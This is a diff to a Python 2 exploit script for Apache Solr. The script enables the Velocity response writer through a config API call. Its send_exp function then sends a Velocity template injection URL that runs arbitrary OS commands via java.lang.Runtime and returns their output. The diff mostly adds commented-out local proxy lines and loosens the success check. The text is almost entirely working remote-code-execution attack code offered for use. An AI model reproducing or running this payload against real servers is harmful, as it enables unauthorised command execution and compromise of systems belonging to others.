@@ -36,7 +36,9 @@ def get_code_name(url):
         
     core_url = url + '/solr/admin/cores?indexInfo=false&wt=json'
     print '[+] Querying Core Name: '+core_url,'\n'
+    proxies = {"http":"http://127.0.0.1:8080"}
     try:
+        # r = requests.get(core_url,proxies=proxies)
         r = requests.get(core_url)
         if r.status_code == 200 and 'responseHeader' in r.content and 'status' in r.content:
             json_str = json.loads(r.content)
@@ -71,6 +73,7 @@ def update_queryresponsewriter(core_name_url):
     }'''
     proxies = {"http":"http://127.0.0.1:8080"}
     r = requests.post(core_name_url,headers=headers,data=payload)
+    # r = requests.post(core_name_url,headers=headers,data=payload,proxies=proxies)
     if r.status_code == 200 and 'responseHeader' in r.content:
         print "[+] maybe enable Successful!"
         exp_url = core_name_url[:-7]
@@ -82,9 +85,10 @@ def update_queryresponsewriter(core_name_url):
         print "[+] Enable Fail!\n"
 def send_exp(exp_url,cmd):
     exp_url = exp_url + r"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27" + cmd + r"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
-    
+    proxies = {"http":"http://127.0.0.1:8080"}
     r = requests.get(exp_url)
-    if r.status_code == 400 or r.status_code == 500 and len(r.content) >0:
+    # r = requests.get(exp_url,proxies=proxies)
+    if r.status_code == 400 or r.status_code == 500  or r.status_code ==200 and len(r.content) >0:
         print ">>> [+] Exp Send Successful! <<<"
         print "____________________________________________________________"
         print '\n',exp_url,'\n'
